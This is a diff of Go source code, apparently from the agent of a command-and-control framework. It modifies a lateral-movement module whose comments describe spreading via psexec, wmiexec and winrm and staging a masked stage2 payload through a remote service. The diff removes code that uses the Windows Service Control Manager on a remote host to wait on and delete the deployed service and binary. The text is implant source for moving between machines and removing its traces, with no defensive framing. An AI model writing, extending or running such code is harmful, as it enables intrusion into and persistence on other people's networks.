@@ -77,10 +77,10 @@ func lateralMove(payload lateralPayload) (string, error) {
 // them with the server's use_server_config option.
 func lateralMoveWithProgress(payload lateralPayload, publish func(string)) (string, error) {
 	// Guard on the real dependency instead of the hosting mode: loader
-	// deployments stream a server-staged artifact and never touch this
-	// binary, so a memory-hosted source may run them. Every legacy method
-	// still copies or re-executes this binary and keeps refusing from an
-	// in-memory host.
+	// deployments stream a server-staged artifact and psexec stages the
+	// embedded dedicated lateral service, so a memory-hosted source may run
+	// both. The legacy wmiexec and winrm paths still copy or stream this
+	// binary and keep refusing from an in-memory host.
 	if lateralUsesSelfBinary(payload) && memoryHosted() {
 		return "", errMemoryHosted
 	}
@@ -198,8 +198,9 @@ func lateralLoaderArtifact(payload lateralPayload, deadline time.Time) ([]byte, 
 // demand-start service. Its linked stage1 worker fetches the masked stage2
 // payload from the listener's staging endpoint, installs the agent, and
 // stops. This caller then waits for successful service completion and
-// removes the service and host binary itself; the server cleanup command
-// is only a retry path when this immediate cleanup stays pending.
+// removes the service and host binary itself; the control plane's cleanup
+// command is only a retry path when this immediate cleanup stays pending,
+// and runs through the dedicated PowerShell worker, never this binary.
 func lateralPsexecMove(payload lateralPayload, targetSession, serviceName, binaryName string, publish func(string)) (string, error) {
 	startedAt := time.Now()
 	cfg, err := loadConfig()
@@ -250,41 +251,6 @@ func lateralPsexecMove(payload lateralPayload, targetSession, serviceName, binar
 		return ack + "\nlateral cleanup pending: " + err.Error(), nil
 	}
 	return ack + "\n" + cleanup, nil
-}
-
-// waitStage1Stopped observes only this deployment's service, never another agent.
-// A successful service exit means stage1 created the new agent process.
-func waitStage1Stopped(host, name string, timeout time.Duration) error {
-	debugEvent("scm.wait_stopped.begin", nil)
-	var machine *uint16
-	if host != "" {
-		pointer, err := syscall.UTF16PtrFromString(`\\` + host)
-		if err != nil {
-			return err
-		}
-		machine = pointer
-	}
-	debugEvent("scm.wait.open_manager.begin", nil)
-	scm, _, callErr := procOpenSCManagerW.Call(uintptr(unsafe.Pointer(machine)), 0, 1)
-	if scm == 0 {
-		debugEvent("scm.wait.open_manager.failed", callErr)
-		return fmt.Errorf("open SC manager on %s: %w", host, callErr)
-	}
-	debugEvent("scm.wait.open_manager.complete", nil)
-	defer procCloseServiceHandle.Call(scm)
-	serviceName, err := syscall.UTF16PtrFromString(name)
-	if err != nil {
-		return err
-	}
-	debugEvent("scm.wait.open_service.begin", nil)
-	service, _, callErr := procOpenServiceW.Call(scm, uintptr(unsafe.Pointer(serviceName)), 4)
-	if service == 0 {
-		debugEvent("scm.wait.open_service.failed", callErr)
-		return serviceLookupOutcome(callErr)
-	}
-	debugEvent("scm.wait.open_service.complete", nil)
-	defer procCloseServiceHandle.Call(service)
-	return waitStage1ServiceStopped(service, timeout)
 }
 
 // waitStage1ServiceStopped polls an existing handle without reconnecting to SCM.
@@ -465,42 +431,6 @@ func scmDeleteService(host, serviceName string) (bool, error) {
 	}
 	debugEvent("scm.delete_service.complete", nil)
 	return true, nil
-}
-
-// runLateralCleanupChild is the --lateral-cleanup-child entry point: it
-// removes the psexec deployment artifacts on the target. Failures print to
-// standard output (exit 0) so the parent passes the explanation back.
-func runLateralCleanupChild(args []string) error {
-	if len(args) != 2 || args[0] != "--lateral-cleanup-child" {
-		return errors.New("lateral cleanup child requires a JSON payload argument")
-	}
-	var payload lateralCleanupPayload
-	if err := json.Unmarshal([]byte(args[1]), &payload); err != nil {
-		return fmt.Errorf("decode lateral cleanup payload: %w", err)
-	}
-	result, err := lateralCleanup(payload)
-	if err != nil {
-		fmt.Println("Lateral cleanup failed: " + err.Error())
-		return nil
-	}
-	fmt.Println(result)
-	return nil
-}
-
-// lateralCleanup deletes the temporary launcher service and its host
-// binary on the target. It first waits for the linked stage1 worker to
-// finish, so a still-running deployment is never deleted underneath itself.
-func lateralCleanup(payload lateralCleanupPayload) (string, error) {
-	debugEvent("lateral.cleanup.begin", nil)
-	if err := waitStage1Stopped(payload.Host, payload.ServiceName, 15*time.Second); err != nil {
-		var failed *launcherFailure
-		if !errors.As(err, &failed) {
-			return "", err
-		}
-	}
-	return lateralCleanupStopped(payload, func() (bool, error) {
-		return scmDeleteService(payload.Host, payload.ServiceName)
-	})
 }
 
 // lateralCleanupStopped removes artifacts after a caller has established that
